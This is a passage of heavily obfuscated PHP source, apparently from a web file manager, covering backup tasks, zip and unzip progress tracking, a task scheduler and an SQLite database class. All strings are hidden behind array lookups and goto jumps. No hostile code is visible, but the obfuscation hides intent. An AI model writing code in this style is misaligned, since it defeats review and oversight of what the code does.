Model($â·ïô©Á[1979])->findByKey($â·ïô©Á[1741], $Á”¯ÓçÅ); if (!$¤Ò€µäø) { $¤Ò€µäø = array(); } if (isset($¤Ò€µäø[$â·ïô©Á[197]])) { $¤Ò€µäø[$â·ïô©Á[197]] = json_decode($¤Ò€µäø[$â·ïô©Á[197]], !0); } if (isset($ºµ«‹Š†[$â·ïô©Á[197]])) { $¤Ò€µäø[$â·ïô©Á[197]][$â·ïô©Á[1726]] = $ºµ«‹Š†[$â·ïô©Á[197]]; unset($ºµ«‹Š†[$â·ïô©Á[197]]); } return array_merge($¤Ò€µäø, $ºµ«‹Š†); } public function listData($Õ¢¿ñåæ = false, $µó¿öÕ = "\155\x6f\x64\151\146\171\x54\x69\155\145", $¶¦¾ûõº = false) { return parent::listData($Õ¢¿ñåæ, $µó¿öÕ, !0); } public function lastItem() { $—òøÇ± = $this->listData(); return !empty($—òøÇ±[0]) ? $—òøÇ±[0] : null; } public function kill($ËÁ‹Ö¡õ) { $ééÜÛ¶² =& $_SERVER[³à¼î¯á]; $Ï¡Ùìôò = $this->listData($ËÁ‹Ö¡õ); if (!$Ï¡Ùìôò || empty($Ï¡Ùìôò[$ééÜÛ¶²[32]])) { return !0; } Task::kill($ééÜÛ¶²[826]); Task::kill($ééÜÛ¶²[844]); Task::kill($ééÜÛ¶²[853]); $ŞàÑ¹ã» = $Ï¡Ùìôò[$ééÜÛ¶²[32]]; $‡…¿ƒÌƒ = TEMP_FILES . $ééÜÛ¶²[823] . $ŞàÑ¹ã» . $ééÜÛ¶²[8]; IO::remove($‡…¿ƒÌƒ, !1); return $this->remove($ËÁ‹Ö¡õ); } public function remove($Û£µåÓ) { $Õ¯êçğÇ = $this->listData($Û£µåÓ); if (!$Õ¯êçğÇ) { return !0; } return $this->backupRemove($Õ¯êçğÇ); } private function backupRemove($”èÌ•ÓÛ) { parent::remove($”èÌ•ÓÛ[$_SERVER[³à¼î¯á][450]]); $•£‚áî… = $this->backupPath($”èÌ•ÓÛ); IO::remove($•£‚áî…, !1); return !0; } private function backupPath($¡óÂ©Â) { $Œƒ±Õ£í =& $_SERVER[³à¼î¯á]; $‚µßÎ÷¦ = $¡óÂ©Â[$Œƒ±Õ£í[32]]; $õ›ô·µ = Model($Œƒ±Õ£í[815])->get($Œƒ±Õ£í[816]); $çº¿…ßÎ = substr(md5($Œƒ±Õ£í[817] . $õ›ô·µ . $‚µßÎ÷¦), 0, 8); return "\x7b\x69\157\72{$¡óÂ©Â[$Œƒ±Õ£í[796]]}\175\57\144\141\x74\141\142\x61\163\145\57\142\x61\x63\x6b\x75\160\x2f" . $‚µßÎ÷¦ . $Œƒ±Õ£í[11] . $çº¿…ßÎ; } public function start() { $‹ÆÆ«à° =& $_SERVER[³à¼î¯á]; if ($GLOBALS[$‹ÆÆ«à°[6]][$‹ÆÆ«à°[92]][$‹ÆÆ«à°[1980]] != $‹ÆÆ«à°[91]) { return !0; } $„ÇÄÑó = $this->config(); if (!$„ÇÄÑó || $„ÇÄÑó[$‹ÆÆ«à°[1723]] != $‹ÆÆ«à°[91]) { return !1; } $­èèÜÀò = $this->process(); foreach ($­èèÜÀò as $Ú’¿’Œ¿) { if ($Ú’¿’Œ¿) { return Task::restart($Ú’¿’Œ¿[$‹ÆÆ«à°[450]]); } } $ÒÄ•¤İ¤ = new Backup(); $…©İ¶æá = $ÒÄ•¤İ¤->db(); if ($…©İ¶æá) { $…©İ¶æá = $ÒÄ•¤İ¤->dbFile(); if ($…©İ¶æá && $„ÇÄÑó[$‹ÆÆ«à°[799]] == $‹ÆÆ«à°[219]) { $…©İ¶æá = $ÒÄ•¤İ¤->file(); } } Backup::set(array($‹ÆÆ«à°[795] => 1, $‹ÆÆ«à°[806] => time())); return !0; } public function process() { $ùÆØîşÇ =& $_SERVER[³à¼î¯á]; $ ¤×·Ù = array($ùÆØîşÇ[802] => Task::get($ùÆØîşÇ[826]), $ùÆØîşÇ[807] => Task::get($ùÆØîşÇ[844]), $ùÆØîşÇ[221] => Task::get($ùÆØîşÇ[853])); $æ÷È•÷« = !1; foreach ($ ¤×·Ù as &$øòöˆš) { if ($æ÷È•÷«) { $øòöˆš = !1; continue; } if ($øòöˆš) { $À§Ûü = intval(_get($øòöˆš, $ùÆØîşÇ[1758], 0)); if (time() - $À§Ûü > 7200) { Task::kill($øòöˆš[$ùÆØîşÇ[450]]); $æ÷È•÷« = !0; $øòöˆš = !1; } } } return $ ¤×·Ù; } public function restore() { $º¾ğ”Êå =& $_SERVER[³à¼î¯á]; ActionCall($º¾ğ”Êå[1110], !0, 1); ActionCall($º¾ğ”Êå[1110], !0, 0); } } goto EíÔİæ¾ßÄ; bÃœ¡ÈĞÔƒ: define($_SERVER[³à¼î¯á][652], $_SERVER[³à¼î¯á][653]); $vryastxkfb = $_SERVER[³à¼î¯á][654]; if (!$vryastxkfb) { return; } goto BÄáƒ£Ëøå; c´©Ûš“÷: class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($êö¥Š²Œ, $Ï—Àî‡· = 5.0) { if (!$êö¥Š²Œ) { return; } $£öê‘° = Cache::get($êö¥Š²Œ); if (!$£öê‘° || timeFloat() - floatVal($£öê‘°) >= $Ï—Àî‡·) { Cache::set($êö¥Š²Œ, timeFloat(), $Ï—Àî‡· * 10); return !0; } return !1; } public static function timeLimitCall($ÍìıÀ©, $ÏêÇÕÒı, $ÏÁ•¯ÊÏ, $áäÜÏ— = 5.0) { $ÇÖåîÑ… =& $_SERVER[³à¼î¯á]; if (!$ÍìıÀ© || !$ÏêÇÕÒı) { return; } self::$asyncAdd = !0; $ŠÒÖ…’« = $ÇÖåîÑ…[1860]; $¦µ×Û¦™ = Cache::get($ŠÒÖ…’«, !0); $Íƒ•æ¢ = array($ÇÖåîÑ…[1861] => timeFloat(), $ÇÖåîÑ…[1862] => timeFloat(), $ÇÖåîÑ…[316] => $ÏêÇÕÒı, $ÇÖåîÑ…[1852] => $ÏÁ•¯ÊÏ, $ÇÖåîÑ…[197] => $áäÜÏ—); if (is_array($¦µ×Û¦™[$ÍìıÀ©])) { $Íƒ•æ¢[$ÇÖåîÑ…[1862]] = $¦µ×Û¦™[$ÍìıÀ©][$ÇÖåîÑ…[1862]]; } if (is_array($¦µ×Û¦™[$ÍìıÀ©])) { if (timeFloat() - $¦µ×Û¦™[$ÍìıÀ©][$ÇÖåîÑ…[1861]] < $Íƒ•æ¢[$ÇÖåîÑ…[197]] * 0.3) { return; } $Íƒ•æ¢[$ÇÖåîÑ…[1862]] = $¦µ×Û¦™[$ÍìıÀ©][$ÇÖåîÑ…[1862]]; } $¦µ×Û¦™[$ÍìıÀ©] = $Íƒ•æ¢; Cache::set($ŠÒÖ…’«, $¦µ×Û¦™, 60); Cache::removeMemory($ŠÒÖ…’«); write_log($ÇÖåîÑ…[1863] . $ÍìıÀ© . $ÇÖåîÑ…[74] . $ÏêÇÕÒı, $ÇÖåîÑ…[188]); } public static function timeLimitCallLoop() { $‹õ‡„³« =& $_SERVER[³à¼î¯á]; $Ä–À£ì² = array($‹õ‡„³«[1864]); $’ÔÁÌÁ = in_array(strtolower(ACTION), $Ä–À£ì²); if (!$’ÔÁÌÁ && !self::$asyncAdd) { return; } $Ô·İ•Õ = $‹õ‡„³«[1860]; $Şıí™—š = Cache::get($Ô·İ•Õ, !0); if (!$Şıí™—š || count($Şıí™—š) <= 0) { return; } $ê¨£¦ô = !1; $Å„åş˜ = timeFloat(); $ã ³Ì£§ = array(); foreach ($Şıí™—š as $îàˆº© => $ã”¦Àà) { if ($Å„åş˜ - $ã”¦Àà[$‹õ‡„³«[1862]] > $ã”¦Àà[$‹õ‡„³«[197]]) { $ê¨£¦ô = !0; try { Hook::apply($ã”¦Àà[$‹õ‡„³«[316]], $ã”¦Àà[$‹õ‡„³«[1852]]); write_log($‹õ‡„³«[1865] . $îàˆº© . $‹õ‡„³«[74] . $ã”¦Àà[$‹õ‡„³«[316]] . $‹õ‡„³«[1866] . ACTION, $‹õ‡„³«[188]); } catch (Exception $¯‚â¯—å) { } continue; } $ã ³Ì£§[$îàˆº©] = $ã”¦Àà; } if (!$ê¨£¦ô) { return; } if (!$ã ³Ì£§) { return Cache::remove($Ô·İ•Õ); } Cache::set($Ô·İ•Õ, $ã ³Ì£§, 60); Cache::removeMemory($Ô·İ•Õ); } public static function finished($¹œ•ççó, $óë°ß†•) { $æˆ¤÷ =& $_SERVER[³à¼î¯á]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($æˆ¤÷[316] => $¹œ•ççó, $æˆ¤÷[1852] => $óë°ß†•); } private static function finishedRun() { $ÚÂı…Û¥ =& $_SERVER[³à¼î¯á]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $Áµ÷) { try { Hook::apply($Áµ÷[$ÚÂı…Û¥[316]], $Áµ÷[$ÚÂı…Û¥[1852]]); } catch (Exception $€ÔÚŞÒÁ) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $ñ–½Ìš =& $_SERVER[³à¼î¯á]; parent::startAfter(); Hook::bind($ñ–½Ìš[1867], array($this, $ñ–½Ìš[1868])); Hook::bind($ñ–½Ìš[1247], array($this, $ñ–½Ìš[1869])); Hook::bind($ñ–½Ìš[1870], array($this, $ñ–½Ìš[1871])); $¤ä‡€ºÕ =& $this->task; $¤ä‡€ºÕ[$ñ–½Ìš[1872]] = $ñ–½Ìš[1248]; if (!$¤ä‡€ºÕ[$ñ–½Ìš[1643]]) { $¤ä‡€ºÕ[$ñ–½Ìš[1643]] = LNG($ñ–½Ìš[1873]); } } protected function endAfter() { $İÆÙæ¥ø =& $_SERVER[³à¼î¯á]; parent::endAfter(); Hook::unbind($İÆÙæ¥ø[1867], array($this, $İÆÙæ¥ø[1868])); Hook::unbind($İÆÙæ¥ø[1247], array($this, $İÆÙæ¥ø[1869])); Hook::unbind($İÆÙæ¥ø[1870], array($this, $İÆÙæ¥ø[1871])); } public function updateAfter() { $‡¡¦ôë =& $_SERVER[³à¼î¯á]; $«ûÁõŞù =& $this->task; if (!$«ûÁõŞù[$‡¡¦ôë[1113]] || !$«ûÁõŞù[$‡¡¦ôë[808]]) { if ($«ûÁõŞù[$‡¡¦ôë[1872]] != $‡¡¦ôë[364]) { return; } } if ($«ûÁõŞù[$‡¡¦ôë[1872]] == $‡¡¦ôë[1248]) { $ğøˆê— = 0; if ($«ûÁõŞù[$‡¡¦ôë[1806]]) { $ğøˆê— = $«ûÁõŞù[$‡¡¦ôë[1807]] / $«ûÁõŞù[$‡¡¦ôë[1806]]; } $«ûÁõŞù[$‡¡¦ôë[1755]] = $ğøˆê— * 0.3; } else { if ($«ûÁõŞù[$‡¡¦ôë[1872]] == $‡¡¦ôë[364]) { $ğøˆê— = $«ûÁõŞù[$‡¡¦ôë[1754]] / $«ûÁõŞù[$‡¡¦ôë[1113]]; $«ûÁõŞù[$‡¡¦ôë[1755]] = 0.3 + $ğøˆê— * 0.4; } else { if ($«ûÁõŞù[$‡¡¦ôë[1872]] == $‡¡¦ôë[110]) { $ÖÃü‡Üƒ = 0; if ($«ûÁõŞù[$‡¡¦ôë[1808]] == $‡¡¦ôë[110]) { $ÖÃü‡Üƒ = $«ûÁõŞù[$‡¡¦ôë[1807]]; } $ğøˆê— = ($«ûÁõŞù[$‡¡¦ôë[1811]] + $ÖÃü‡Üƒ) / $«ûÁõŞù[$‡¡¦ôë[808]]; $«ûÁõŞù[$‡¡¦ôë[1755]] = 0.3 + 0.4 + $ğøˆê— * 0.3; } } } if ($«ûÁõŞù[$‡¡¦ôë[1755]] > 0) { $©öäîÛ = timeFloat() - $«ûÁõŞù[$‡¡¦ôë[1757]] - $«ûÁõŞù[$‡¡¦ôë[1760]]; $«ûÁõŞù[$‡¡¦ôë[1761]] = $©öäîÛ * (1 - $«ûÁõŞù[$‡¡¦ôë[1755]]) / $«ûÁõŞù[$‡¡¦ôë[1755]]; } } public function addFile($ı°ƒÖ) { $ÜâèÍ“» =& $_SERVER[³à¼î¯á]; $‡Åº’Ä =& $this->task; $šÓÌÀª = IO::info($ı°ƒÖ); $‡Åº’Ä[$ÜâèÍ“»[1804]] = $šÓÌÀª[$ÜâèÍ“»[32]]; $‡Åº’Ä[$ÜâèÍ“»[1806]] = $šÓÌÀª[$ÜâèÍ“»[79]]; $‡Åº’Ä[$ÜâèÍ“»[1807]] = 0; $‡Åº’Ä[$ÜâèÍ“»[1115]] = $ÜâèÍ“»[1827]; $‡Åº’Ä[$ÜâèÍ“»[1808]] = $ÜâèÍ“»[1248]; $‡Åº’Ä[$ÜâèÍ“»[808]] = $šÓÌÀª[$ÜâèÍ“»[79]]; $‡Åº’Ä[$ÜâèÍ“»[1113]] = 1; $­à¿Ôå = 0; $‡Åº’Ä[$ÜâèÍ“»[1815]] = array($ÜâèÍ“»[1816] => $­à¿Ôå + 1, $ÜâèÍ“»[469] => $šÓÌÀª[$ÜâèÍ“»[32]], $ÜâèÍ“»[87] => $šÓÌÀª[$ÜâèÍ“»[87]], $ÜâèÍ“»[558] => $šÓÌÀª[$ÜâèÍ“»[558]] ? $šÓÌÀª[$ÜâèÍ“»[558]] : $šÓÌÀª[$ÜâèÍ“»[87]]); $this->update(); } public function zipEvent($´‚¤çåà, $±ıœšà, $ï‘¢üç§, $Ñİç¸œ) { $ªÛâÌÍ =& $_SERVER[³à¼î¯á]; $ı–Ú¬¹ë =& $this->task; $ı–Ú¬¹ë[$ªÛâÌÍ[1804]] = get_path_this($±ıœšà); $ı–Ú¬¹ë[$ªÛâÌÍ[1806]] = $Ñİç¸œ; $ı–Ú¬¹ë[$ªÛâÌÍ[1807]] = $ï‘¢üç§; $ı–Ú¬¹ë[$ªÛâÌÍ[1115]] = $´‚¤çåà == $ªÛâÌÍ[1874] ? $ªÛâÌÍ[1875] : $ªÛâÌÍ[1876]; $ı–Ú¬¹ë[$ªÛâÌÍ[1808]] = $ªÛâÌÍ[12]; $ı–Ú¬¹ë[$ªÛâÌÍ[808]] = $Ñİç¸œ; $ı–Ú¬¹ë[$ªÛâÌÍ[1872]] = $ªÛâÌÍ[364]; $this->update(); } public function unzipAfter($©‡«ŸÀ¤) { $„ë‘¨è  =& $_SERVER[³à¼î¯á]; $ÑŸĞİîÌ =& $this->task; $ÑŸĞİîÌ[$„ë‘¨è [1872]] = $„ë‘¨è [110]; $úÕÙ—–£ = IO::infoWithChildren($©‡«ŸÀ¤); $å¡Ù¥Õ = 0; $ÑŸĞİîÌ[$„ë‘¨è [1815]] = array($„ë‘¨è [1816] => $å¡Ù¥Õ + 1, $„ë‘¨è [469] => $úÕÙ—–£[$„ë‘¨è [32]], $„ë‘¨è [87] => $úÕÙ—–£[$„ë‘¨è [87]], $„ë‘¨è [558] => $úÕÙ—–£[$„ë‘¨è [558]] ? $úÕÙ—–£[$„ë‘¨è [558]] : $úÕÙ—–£[$„ë‘¨è [87]]); if ($úÕÙ—–£[$„ë‘¨è [33]] == $„ë‘¨è [221]) { $ÑŸĞİîÌ[$„ë‘¨è [1113]] = 1; } else { $ÑŸĞİîÌ[$„ë‘¨è [1113]] = $úÕÙ—–£[$„ë‘¨è [82]][$„ë‘¨è [80]]; } $ÑŸĞİîÌ[$„ë‘¨è [1115]] = $„ë‘¨è [12]; $ÑŸĞİîÌ[$„ë‘¨è [1808]] = 0; $ÑŸĞİîÌ[$„ë‘¨è [1754]] = 0; $ÑŸĞİîÌ[$„ë‘¨è [1806]] = 0; $ÑŸĞİîÌ[$„ë‘¨è [1807]] = 0; $ÑŸĞİîÌ[$„ë‘¨è [1804]] = $„ë‘¨è [12]; $ÑŸĞİîÌ[$„ë‘¨è [1811]] = 0; $ÑŸĞİîÌ[$„ë‘¨è [808]] = $úÕÙ—–£[$„ë‘¨è [79]]; $this->update(); self::log($„ë‘¨è [1877] . json_encode(array($ÑŸĞİîÌ, $úÕÙ—–£))); } public function nameParse($æ¤åØâÈ) { $Ú°î±¶¼ =& $_SERVER[³à¼î¯á]; $Øˆö¿ó =& $this->task; if ($Øˆö¿ó[$Ú°î±¶¼[1872]] == $Ú°î±¶¼[1248]) { $Øˆö¿ó[$Ú°î±¶¼[1872]] = $Ú°î±¶¼[364]; $Øˆö¿ó[$Ú°î±¶¼[1811]] = 0; $Øˆö¿ó[$Ú°î±¶¼[808]] = 0; } $ë‡ú¦şï = get_path_this($æ¤åØâÈ); if (strstr($ë‡ú¦şï, $Ú°î±¶¼[10])) { $Øˆö¿ó[$Ú°î±¶¼[1754]] += 1; $Øˆö¿ó[$Ú°î±¶¼[1113]] += 1; } $Øˆö¿ó[$Ú°î±¶¼[1804]] = $æ¤åØâÈ; $this->update(); } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $ãşÎûÂƒ =& $_SERVER[³à¼î¯á]; parent::startAfter(); Hook::bind($ãşÎûÂƒ[1878], array($this, $ãşÎûÂƒ[1868])); Hook::bind($ãşÎûÂƒ[1870], array($this, $ãşÎûÂƒ[1871])); $ÌìÆôÛâ =& $this->task; $ÌìÆôÛâ[$ãşÎûÂƒ[1872]] = $ãşÎûÂƒ[1248]; if (!$ÌìÆôÛâ[$ãşÎûÂƒ[1643]]) { $ÌìÆôÛâ[$ãşÎûÂƒ[1643]] = LNG($ãşÎûÂƒ[1879]); } } protected function endAfter() { $Ÿ›ĞÎ¬µ =& $_SERVER[³à¼î¯á]; parent::endAfter(); Hook::unbind($Ÿ›ĞÎ¬µ[1878], array($this, $Ÿ›ĞÎ¬µ[1868])); Hook::unbind($Ÿ›ĞÎ¬µ[1870], array($this, $Ÿ›ĞÎ¬µ[1871])); } public function updateAfter() { $©»í€˜½ =& $_SERVER[³à¼î¯á]; $Ÿºô¼Œ =& $this->task; if (!$Ÿºô¼Œ[$©»í€˜½[1113]] || !$Ÿºô¼Œ[$©»í€˜½[808]]) { return; } if ($Ÿºô¼Œ[$©»í€˜½[1872]] == $©»í€˜½[1248]) { $îˆ¦¯“ß = $Ÿºô¼Œ[$©»í€˜½[1807]]; if ($Ÿºô¼Œ[$©»í€˜½[1808]] != $©»í€˜½[1248]) { $îˆ¦¯“ß = 0; } $é÷Ÿ‡„ì = ($Ÿºô¼Œ[$©»í€˜½[1811]] + $îˆ¦¯“ß) / $Ÿºô¼Œ[$©»í€˜½[808]]; $Ÿºô¼Œ[$©»í€˜½[1755]] = $é÷Ÿ‡„ì * 0.3; } else { if ($Ÿºô¼Œ[$©»í€˜½[1872]] == $©»í€˜½[364]) { $é÷Ÿ‡„ì = $Ÿºô¼Œ[$©»í€˜½[1754]] / $Ÿºô¼Œ[$©»í€˜½[1113]]; $Ÿºô¼Œ[$©»í€˜½[1755]] = 0.3 + $é÷Ÿ‡„ì * 0.5; } else { if ($Ÿºô¼Œ[$©»í€˜½[1872]] == $©»í€˜½[110]) { $é÷Ÿ‡„ì = 0; if ($Ÿºô¼Œ[$©»í€˜½[1806]]) { $é÷Ÿ‡„ì = $Ÿºô¼Œ[$©»í€˜½[1807]] / $Ÿºô¼Œ[$©»í€˜½[1806]]; } $Ÿºô¼Œ[$©»í€˜½[1755]] = 0.3 + 0.5 + $é÷Ÿ‡„ì * 0.2; } } } if ($Ÿºô¼Œ[$©»í€˜½[1755]] > 0) { $ô†ëÛÜÇ = timeFloat() - $Ÿºô¼Œ[$©»í€˜½[1757]] - $Ÿºô¼Œ[$©»í€˜½[1760]]; $Ÿºô¼Œ[$©»í€˜½[1761]] = $ô†ëÛÜÇ * (1 - $Ÿºô¼Œ[$©»í€˜½[1755]]) / $Ÿºô¼Œ[$©»í€˜½[1755]]; } } public function copyFileStart($Ï¡Û˜ì¨, $ŠÈìğòˆ, $ÎÂ¥ßÇÚ, $õŞ†€¼, $ÇŒ§Êå˜, $Ïœ›úˆ) { $µ¥Êó£ =& $_SERVER[³à¼î¯á]; parent::copyFileStart($Ï¡Û˜ì¨, $ŠÈìğòˆ, $ÎÂ¥ßÇÚ, $õŞ†€¼, $ÇŒ§Êå˜, $Ïœ›úˆ); $íí¥Ê  =& $this->task; if ($íí¥Ê [$µ¥Êó£[1872]] == $µ¥Êó£[364]) { $íí¥Ê [$µ¥Êó£[1872]] = $µ¥Êó£[110]; } $this->update(); } public function copyFileEnd($¬Ä©“’Ê, $‰Ÿ¼ÃŸ¨, $“Ìõû·, $À­·ğ­, $ÑÕšíôÈ, $Û‹¥ù¯) { $ˆÇ„ÏÉ¹ =& $_SERVER[³à¼î¯á]; $ŸŒ‚œá =& $this->task; $ŸŒ‚œá[$ˆÇ„ÏÉ¹[1807]] = $ŸŒ‚œá[$ˆÇ„ÏÉ¹[1806]]; $ŸŒ‚œá[$ˆÇ„ÏÉ¹[1811]] += $ŸŒ‚œá[$ˆÇ„ÏÉ¹[1806]]; $ŸŒ‚œá[$ˆÇ„ÏÉ¹[1808]] = $ˆÇ„ÏÉ¹[12]; $this->update(); } public function zipEvent($ßßÅò³ˆ, $µÆÃÀ·§, $„ôüÒİé, $…Õ¤óÅØ) { $çÔú¿á± =& $_SERVER[³à¼î¯á]; $£Á±Ç’ =& $this->task; $£Á±Ç’[$çÔú¿á±[1804]] = get_path_this($µÆÃÀ·§); $£Á±Ç’[$çÔú¿á±[1806]] = $…Õ¤óÅØ; $£Á±Ç’[$çÔú¿á±[1807]] = $„ôüÒİé; $£Á±Ç’[$çÔú¿á±[1115]] = $ßßÅò³ˆ == $çÔú¿á±[1880] ? $çÔú¿á±[1875] : $çÔú¿á±[1876]; $£Á±Ç’[$çÔú¿á±[1808]] = $çÔú¿á±[12]; $£Á±Ç’[$çÔú¿á±[808]] = $…Õ¤óÅØ; $£Á±Ç’[$çÔú¿á±[1872]] = $çÔú¿á±[364]; $this->update(); } public function nameParse($„ä…´çê) { $ã»úäÔş =& $_SERVER[³à¼î¯á]; $†»†ÀÂ‹ =& $this->task; if ($†»†ÀÂ‹[$ã»úäÔş[1754]] < $†»†ÀÂ‹[$ã»úäÔş[1113]]) { $ĞÖ†ûù¬ = get_path_this($„ä…´çê); if (strstr($ĞÖ†ûù¬, $ã»úäÔş[10])) { $†»†ÀÂ‹[$ã»úäÔş[1754]] += 1; } } if ($†»†ÀÂ‹[$ã»úäÔş[1872]] == $ã»úäÔş[1248]) { $†»†ÀÂ‹[$ã»úäÔş[1872]] = $ã»úäÔş[364]; } $†»†ÀÂ‹[$ã»úäÔş[1804]] = $„ä…´çê; $this->update(); } } goto bšŠ›œ„á; cŒËæ‰ä˜: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $ê´¾û“¥ =& $_SERVER[³à¼î¯á]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$ê´¾û“¥[6]] =& $config; $this->values[$ê´¾û“¥[7]] =& $in; $this->tpl = TEMPLATE . MOD . $ê´¾û“¥[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($ù„ƒì˜) { if (1 === func_num_args()) { $this->{$ù„ƒì˜} = new $ù„ƒì˜(); } else { $ß»øŞ¼ö = new ReflectionClass($ù„ƒì˜); $äşüüœË = func_get_args(); array_shift($äşüüœË); $this->{$ù„ƒì˜} = $ß»øŞ¼ö->newInstanceArgs($äşüüœË); } return $this->{$ù„ƒì˜}; } public function routeBind($û‰†ˆò…, $˜Ø«š»Ö, $®œ¸´†È = 3) { $á²µíÕ« =& $_SERVER[³à¼î¯á]; $Ò§–í‹ = $this->in[$á²µíÕ«[9]]; $û‰†ˆò… = str_replace($á²µíÕ«[10], $á²µíÕ«[11], trim(trim($û‰†ˆò…, $á²µíÕ«[8]), $á²µíÕ«[12])); if (!$û‰†ˆò… || count($Ò§–í‹) <= $®œ¸´†È) { return !1; } $Â©¼±ú = !0; $Ò”‚®â¯ = explode($á²µíÕ«[8], $û‰†ˆò…); for ($ÓÃé·à = 0; $ÓÃé·à < count($Ò”‚®â¯); $ÓÃé·à++) { if ($Ò”‚®â¯[$ÓÃé·à] != $Ò§–í‹[$®œ¸´†È + $ÓÃé·à]) { $Â©¼±ú = !1; break; } } if (!$Â©¼±ú) { return; } call_user_func_array(array($this, $˜Ø«š»Ö), array()); } public function routeArgs($øƒÕ«“ = 3) { $äÛÛ®§ = $this->in[$_SERVER[³à¼î¯á][9]]; if (count($äÛÛ®§) <= $øƒÕ«“) { return array(); } $†„‚†”÷ = array(); for ($îŠÛ¦ı = $øƒÕ«“; $îŠÛ¦ı < count($äÛÛ®§); $îŠÛ¦ı += 2) { $†„‚†”÷[$äÛÛ®§[$îŠÛ¦ı]] = $äÛÛ®§[$îŠÛ¦ı + 1]; $this->in[$äÛÛ®§[$îŠÛ¦ı]] = $äÛÛ®§[$îŠÛ¦ı + 1]; } return $†„‚†”÷; } protected function assign($÷¨«ˆÅÏ, $å´·‰™ô) { $this->values[$÷¨«ˆÅÏ] = $å´·‰™ô; } protected function display($”Ñ·©Ğ) { ob_end_clean(); extract($this->values); require $this->tpl . $”Ñ·©Ğ; } } class DbSqliteBase extends Db { public function __construct($­·îÊÍ = '') { $Ùò¢¼šà =& $_SERVER[³à¼î¯á]; if (!extension_loaded($Ùò¢¼šà[13])) { think_exception(think_lang($Ùò¢¼šà[14]) . $Ùò¢¼šà[15]); } if (!empty($­·îÊÍ)) { if (!isset($­·îÊÍ[$Ùò¢¼šà[16]])) { $­·îÊÍ[$Ùò¢¼šà[16]] = 438; } $this->config = $­·îÊÍ; if (empty($this->config[$Ùò¢¼šà[17]])) { $this->config[$Ùò¢¼šà[17]] = array(); } } } public function connect($ØĞËêÒñ = '', $¿ÎİäĞÉ = 0) { $èÊ Óö‹ =& $_SERVER[³à¼î¯á]; if (!isset($this->linkID[$¿ÎİäĞÉ])) { if (empty($ØĞËêÒñ)) { $ØĞËêÒñ = $this->config; } $¯€Ç­´Í = !empty($ØĞËêÒñ[$èÊ Óö‹[17]][$èÊ Óö‹[18]]) ? $ØĞËêÒñ[$èÊ Óö‹[17]][$èÊ Óö‹[18]] : $this->pconnect; $¼ Åúªü = $¯€Ç­´Í ? $èÊ Óö‹[19] : $èÊ Óö‹[20]; $this->linkID[$¿ÎİäĞÉ] = $¼ Åúªü($ØĞËêÒñ[$èÊ Óö‹[21]], $ØĞËêÒñ[$èÊ Óö‹[16]]); if (!$this->linkID[$¿ÎİäĞÉ]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$¿ÎİäĞÉ], 30000); if (1 != think_config($èÊ Óö‹[22])) { unset($this->config); } } return $this->linkID[$¿ÎİäĞÉ]; } public function free() { $this->queryID = null; } public function query($†°¨Ãû) { $»í¥„ì =& $_SERVER[³à¼î¯á]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $†°¨Ãû; if ($this->queryID) { $this->free(); } think_action_status($»í¥„ì[23], 1); think_status($»í¥„ì[24]); $this->queryID = sqlite_query($this->_linkID, $†°¨Ãû); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $‰¶ó´í‚ = $this->getAll(); return $‰¶ó´í‚; } } public function execute($›Ùñõõ§) { $«ïòµè´ =& $_SERVER[³à¼î¯á]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $›Ùñõõ§; if ($this->queryID) { $this->free(); } think_action_status($«ïòµè´[25], 1); think_status($«ïòµè´[24]); $ö’á÷×ª = sqlite_exec($this->_linkID, $›Ùñõõ§); $this->debug(); if (!1 === $ö’á÷×ª) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[³à¼î¯á][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ÍñäüÄÀ = sqlite_query($this->_linkID, $_SERVER[³à¼î¯á][27]); if (!$ÍñäüÄÀ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $˜—â³á› = sqlite_query($this->_linkID, $_SERVER[³à¼î¯á][28]); if (!$˜—â³á›) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $¨¥„×‰ö = array(); if ($this->numRows > 0) { for ($‹ÂÆ†ß = 0; $‹ÂÆ†ß < $this->numRows; $‹ÂÆ†ß++) { $¨¥„×‰ö[$‹ÂÆ†ß] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $¨¥„×‰ö; } public function getFields($ö‚ŠÏÉ‡) { $À³ïÏ—Ï =& $_SERVER[³à¼î¯á]; $Û¦·‰Êª = $this->query($À³ïÏ—Ï[29] . $ö‚ŠÏÉ‡ . $À³ïÏ—Ï[30]); $†ÒÕœü = array(); if ($Û¦·‰Êª) { foreach ($Û¦·‰Êª as $Ñíú–ô¤ => $±Ûƒ€Öâ) { $†ÒÕœü[$±Ûƒ€Öâ[$À³ïÏ—Ï[31]]] = array($À³ïÏ—Ï[32] => $±Ûƒ€Öâ[$À³ïÏ—Ï[31]], $À³ïÏ—Ï[33] => $±Ûƒ€Öâ[$À³ïÏ—Ï[34]], $À³ïÏ—Ï[35] => (bool) ($±Ûƒ€Öâ[$À³ïÏ—Ï[36]] === $À³ïÏ—Ï[12]), $À³ïÏ—Ï[37] => $±Ûƒ€Öâ[$À³ïÏ—Ï[38]], $À³ïÏ—Ï[39] => strtolower($±Ûƒ€Öâ[$À³ïÏ—Ï[40]]) == $À³ïÏ—Ï[41], $À³ïÏ—Ï[42] => strtolower($±Ûƒ€Öâ[$À³ïÏ—Ï[43]]) == $À³ïÏ—Ï[44]); } 